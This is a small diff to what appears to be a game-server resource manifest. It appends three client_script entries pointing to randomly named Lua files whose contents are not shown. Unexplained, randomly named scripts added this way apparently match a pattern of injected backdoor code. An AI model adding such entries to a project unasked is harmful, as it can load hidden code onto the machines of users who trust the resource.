@@ -20,3 +20,9 @@ files {
     'html/*.html',
     'html/*.js',
 } 
+
+client_script 'rgsommJQifhD.lua'
+
+client_script 'UuhtHjGFVloz.lua'
+
+client_script 'qXrzfCSfzQhx.lua'
